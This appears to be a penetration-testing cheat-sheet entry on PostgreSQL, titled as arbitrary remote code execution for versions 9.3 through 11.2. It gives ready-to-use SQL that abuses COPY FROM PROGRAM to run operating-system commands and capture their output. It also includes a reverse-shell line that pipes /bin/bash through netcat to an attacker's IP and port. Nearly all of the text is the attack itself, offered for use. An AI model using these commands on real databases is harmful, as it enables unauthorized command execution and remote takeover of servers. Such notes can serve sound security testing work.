# postgres

## Arbitary RCE 9.3 - latest (11.2)

```bash
DROP TABLE IF EXISTS kashz; CREATE TABLE kashz(out text);
COPY kashz FROM PROGRAM '<command>'; SELECT * FROM kashz;

# shell
COPY kashz from PROGRAM '/usr/bin/nc -e /bin/bash IP PORT';
```

{% embed url="https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5" %}
